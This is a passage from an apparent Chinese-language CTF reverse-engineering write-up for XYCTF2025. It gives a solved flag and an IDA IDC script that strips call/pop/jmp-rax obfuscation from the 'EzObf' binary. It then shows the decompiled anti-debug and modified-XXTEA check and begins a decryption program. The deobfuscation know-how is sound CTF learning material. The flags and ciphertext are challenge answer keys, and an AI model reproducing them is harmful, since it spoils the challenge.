class="number">119</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.40s\n&quot;</span>, Input);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// flag&#123;L3@rn-ng_1n_0ld_sch00b_@nd_g3x_j0y&#125; -&gt; flag&#123;L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{L3@rn1ng_1n_0ld_sch00l_@nd_g3t_j0y}</p><h2 id="EzObf"><a href="#EzObf" class="headerlink" title="EzObf"></a>EzObf</h2><p>main_0函数跟入发现有混淆，红框处为原真实汇编指令，其他都是混淆指令。</p><p>混淆流程：</p><ol><li>执行真实指令</li><li>call $+5执行pop rax，rax就是call时push到栈的返回地址，也就是pop rax指令的地址。</li><li>给ebx赋值，进行rol计算，最后用rax加上或减去（共两种）rbx，得到跳转地址，进行jmp rax。</li></ol><p>之后每jmp过去一次，那边就都是一样的结构，popfq和pushfq之间就是真实汇编。</p><p>deobf的思路即为nop那一堆pop和push，保留真实汇编指令，然后计算跳转地址，手动计算相对地址写jmp，保持代码执行流程。</p><p><img src="/2025/04/07/XYCTF2025/43.png"></p><p>deobf idc脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="title">NopCode</span><span class="params">(Addr, Length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">PatchByte</span>(Addr + i, <span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">rol</span><span class="params">(value, count, bits = <span class="number">32</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    count = count % bits;</span><br><span class="line">    <span class="keyword">return</span> ((value &lt;&lt; count) | (value &gt;&gt; (bits - count))) &amp; ((<span class="number">1</span> &lt;&lt; bits) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索真实汇编代码的下一个地址</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">FindEnd</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> v = <span class="built_in">Dword</span>(Addr + i);</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">0x5153509C</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Addr + i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索最后的jmp rax指令</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">FindJmpRax</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> v = <span class="built_in">Word</span>(Addr + i);</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">0xE0FF</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Addr + i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索call $+5</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">FindCall</span><span class="params">(Addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x90</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> v = <span class="built_in">Dword</span>(Addr + i);</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="number">0xE8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Addr + i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> StartAddr = <span class="number">0x1401F400D</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 搜索真实汇编代码的下一个指令地址</span></span><br><span class="line">        <span class="keyword">auto</span> EndAddr = <span class="built_in">FindEnd</span>(StartAddr);</span><br><span class="line">        <span class="keyword">if</span> (EndAddr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 真实汇编代码的字节长度</span></span><br><span class="line">        <span class="keyword">auto</span> CodeLength = EndAddr - StartAddr - <span class="number">13</span>;</span><br><span class="line">        <span class="comment">// 搜索Call $+5</span></span><br><span class="line">        <span class="keyword">auto</span> CallAddr = <span class="built_in">FindCall</span>(StartAddr + <span class="number">13</span> + CodeLength);</span><br><span class="line">        <span class="keyword">if</span> (CallAddr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// call $+5的下一条指令地址，即call时push到栈的返回地址</span></span><br><span class="line">        <span class="keyword">auto</span> CalcAddr = CallAddr + <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">auto</span> ebx = <span class="built_in">Dword</span>(CalcAddr + <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">auto</span> rol_Value = <span class="built_in">Byte</span>(CalcAddr + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">auto</span> Mode = <span class="built_in">Dword</span>(CalcAddr + <span class="number">9</span>);</span><br><span class="line">        ebx = <span class="built_in">rol</span>(ebx, rol_Value);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 搜索最尾部的jmp rax指令地址</span></span><br><span class="line">        <span class="keyword">auto</span> JmpRaxAddr = <span class="built_in">FindJmpRax</span>(StartAddr);</span><br><span class="line">        <span class="keyword">if</span> (JmpRaxAddr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 第一部分垃圾指令长度</span></span><br><span class="line">        <span class="keyword">auto</span> TrushCodeLength_1 = CallAddr - (StartAddr + <span class="number">13</span> + CodeLength);</span><br><span class="line">        <span class="comment">// 第二部分垃圾指令长度</span></span><br><span class="line">        <span class="keyword">auto</span> TrushCodeLength_2 = JmpRaxAddr - CallAddr + <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// Nop掉无用的所有代码</span></span><br><span class="line">        <span class="built_in">NopCode</span>(CallAddr, TrushCodeLength_2);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">NopCode</span>(StartAddr, <span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">NopCode</span>(StartAddr + <span class="number">13</span> + CodeLength, TrushCodeLength_1);</span><br><span class="line">        <span class="comment">// 一共两种地址计算，加和减</span></span><br><span class="line">        <span class="keyword">if</span> (Mode == <span class="number">0xffC32B48</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            CalcAddr = CalcAddr - ebx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Mode == <span class="number">0xffC30348</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            CalcAddr = CalcAddr + ebx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">auto</span> JmpCodeAddr = EndAddr;</span><br><span class="line">        <span class="comment">// 计算相对跳转地址</span></span><br><span class="line">        <span class="keyword">auto</span> JmpOffset = CalcAddr - JmpCodeAddr + <span class="number">5</span>;</span><br><span class="line">        <span class="comment">// 写入jmp指令</span></span><br><span class="line">        <span class="built_in">PatchByte</span>(JmpCodeAddr, <span class="number">0xE9</span>);</span><br><span class="line">        <span class="built_in">PatchDword</span>(JmpCodeAddr + <span class="number">1</span>, JmpOffset);</span><br><span class="line">        <span class="comment">// jmp的地址为下一次deobf起始地址</span></span><br><span class="line">        StartAddr = CalcAddr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行完，把main_0剩余代码都手动nop即可。</p><p><img src="/2025/04/07/XYCTF2025/44.png"></p><p>然后Apply patches to input file，应用一下patch，重新打开ida载入程序分析。</p><p>从main_0的jmp进入两层到这边，然后用IDA Delete Function删除sub_1401F7B77函数，然后对jmp那边按E即可重新重构完main函数（如图2），F5即可分析。</p><p><img src="/2025/04/07/XYCTF2025/45.png"></p><p><img src="/2025/04/07/XYCTF2025/46.png"></p><p>Main函数原代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// rdi</span></span><br><span class="line">  HANDLE CurrentProcess; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp-20h] [rbp-458h] BYREF</span></span><br><span class="line">  _DWORD v10[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-438h] BYREF</span></span><br><span class="line">  _BYTE v11[<span class="number">64</span>]; <span class="comment">// [rsp+8h] [rbp-430h] BYREF</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// [rsp+48h] [rbp-3F0h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// [rsp+64h] [rbp-3D4h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+84h] [rbp-3B4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// [rsp+A4h] [rbp-394h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+C4h] [rbp-374h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+E4h] [rbp-354h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> k; <span class="comment">// [rsp+104h] [rbp-334h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [rsp+124h] [rbp-314h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [rsp+144h] [rbp-2F4h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [rsp+164h] [rbp-2D4h]</span></span><br><span class="line">  _DWORD v22[<span class="number">11</span>]; <span class="comment">// [rsp+188h] [rbp-2B0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v23; <span class="comment">// [rsp+1B4h] [rbp-284h]</span></span><br><span class="line">  BOOL v24; <span class="comment">// [rsp+1D4h] [rbp-264h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 j; <span class="comment">// [rsp+1F8h] [rbp-240h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v26; <span class="comment">// [rsp+218h] [rbp-220h]</span></span><br><span class="line">  _DWORD v27[<span class="number">12</span>]; <span class="comment">// [rsp+238h] [rbp-200h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 m; <span class="comment">// [rsp+268h] [rbp-1D0h]</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [rsp+3F4h] [rbp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v30; <span class="comment">// [rsp+3F8h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [rsp+3FCh] [rbp-3Ch]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+400h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [rsp+408h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v34; <span class="comment">// [rsp+410h] [rbp-28h]</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+428h] [rbp-10h]</span></span><br><span class="line">  __int64 v36; <span class="comment">// [rsp+430h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v36 = v3;</span><br><span class="line">  v35 = v4;</span><br><span class="line">  v7 = v10;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">170</span>; i; --i )</span><br><span class="line">    *v7++ = <span class="number">-858993460</span>;</span><br><span class="line">  v34 = (<span class="type">unsigned</span> __int64)v10 ^ <span class="number">0x1401D9000LL</span>;</span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(<span class="number">0x1401ED104LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="number">0x20u</span>);</span><br><span class="line">  <span class="built_in">sub_140087C02</span>(<span class="number">0x1401A1190LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">IsDebuggerPresent</span>() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_1400868E3</span>();</span><br><span class="line">    v12 = v11;</span><br><span class="line">    <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="number">0x10u</span>);</span><br><span class="line">    v23 = <span class="number">8</span>;</span><br><span class="line">    v29 = <span class="number">8</span>;</span><br><span class="line">    v20 = <span class="number">12</span>;</span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">    v16 = <span class="number">0x61C88646</span>;</span><br><span class="line">    v21 = <span class="number">0x95664B48</span>;</span><br><span class="line">    v19 = <span class="number">7</span>;</span><br><span class="line">    v24 = <span class="number">0</span>;</span><br><span class="line">    CurrentProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">    <span class="built_in">CheckRemoteDebuggerPresent</span>(CurrentProcess, &amp;v24);</span><br><span class="line">    <span class="keyword">if</span> ( !v24 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">j_srand</span>(<span class="number">0xAABBu</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">        v22[j] = <span class="built_in">j_rand</span>();</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v29 = v19--;</span><br><span class="line">        v30 = v29 != <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v30 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v15 += v16;</span><br><span class="line">        v17 = (v15 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v23; ++k )</span><br><span class="line">        &#123;</span><br><span class="line">          v26 = __rdtsc();</span><br><span class="line">          v13 = *(_DWORD *)&amp;v12[<span class="number">4</span> * ((k + <span class="number">1</span>) % v23)];</span><br><span class="line">          v29 = (<span class="number">4</span> * v13) ^ (*(_DWORD *)&amp;v12[<span class="number">4</span> * ((k + v23 - <span class="number">1</span>) % v23)] &gt;&gt; <span class="number">5</span>);</span><br><span class="line">          v30 = k + v23 - <span class="number">1</span>;</span><br><span class="line">          v31 = ((<span class="number">16</span> * *(_DWORD *)&amp;v12[<span class="number">4</span> * (v30 % v23)]) ^ (v13 &gt;&gt; <span class="number">3</span>)) + v29;</span><br><span class="line">          v32 = ((<span class="type">unsigned</span> __int8)v17 ^ (<span class="type">unsigned</span> __int8)k) &amp; <span class="number">3</span>;</span><br><span class="line">          v33 = (((*(_DWORD *)&amp;v12[<span class="number">4</span> * (v30 % v23)] ^ v22[v32]) + (v13 ^ v15)) ^ v31) + *(_DWORD *)&amp;v12[<span class="number">4</span> * k];</span><br><span class="line">          *(_DWORD *)&amp;v12[<span class="number">4</span> * k] = v33;</span><br><span class="line">          v14 = v33;</span><br><span class="line">          <span class="keyword">if</span> ( __rdtsc() - v26 &gt; <span class="number">0x83C0</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v27[<span class="number">0</span>] = <span class="number">0xA9934E2F</span>;</span><br><span class="line">      v27[<span class="number">1</span>] = <span class="number">0x30B90FA</span>;</span><br><span class="line">      v27[<span class="number">2</span>] = <span class="number">0xDCBF1D3</span>;</span><br><span class="line">      v27[<span class="number">3</span>] = <span class="number">0x328B5BDE</span>;</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">4</span>; ++m )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v27[m] != v10[m + <span class="number">2</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">sub_140087C02</span>(<span class="number">0x1401A11A8LL</span>);</span><br><span class="line">          <span class="built_in">j_system</span>(byte_1401A11A0);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sub_140087C02</span>(<span class="number">0x1401A11C0LL</span>);</span><br><span class="line">      <span class="built_in">j_system</span>(byte_1401A11A0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_20:</span><br><span class="line">  <span class="built_in">j__RTC_CheckStackVars</span>(&amp;v9, (_RTC_framedesc *)&amp;unk_1401A1140);</span><br><span class="line">  <span class="built_in">j___security_check_cookie</span>((<span class="type">unsigned</span> __int64)v10 ^ v34);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_1401F8E9B</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很清晰看出来是XXTEA加密，密钥是固定种子随机数随机得到的，Delta被魔改，然后密文也能看到。</p><p><strong>注：写WP时用的是旧版附件分析，缺失了后面16字节密文</strong></p><p>完整密文数据：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xa9934e2f</span>, <span class="number">0x30b90fa</span>, <span class="number">0xdcbf1d3</span>, <span class="number">0x328b5bde</span>,</span><br><span class="line"><span class="number">0x44fab4e</span>, <span class="number">0x1dcf0051</span>, <span class="number">0x85ebbe55</span>, <span class="number">0x93aa773a</span></span><br></pre></td></tr></table></figure><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x61C88646</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">7</span>;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">                <span class="keyword">if</span> (z == <span class="number">0xA4F41487</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;11\n&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (y == <span class="number">0xA4F41487</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;11\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">7</span>;</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0xAABB</span>);</span><br><span class="line">    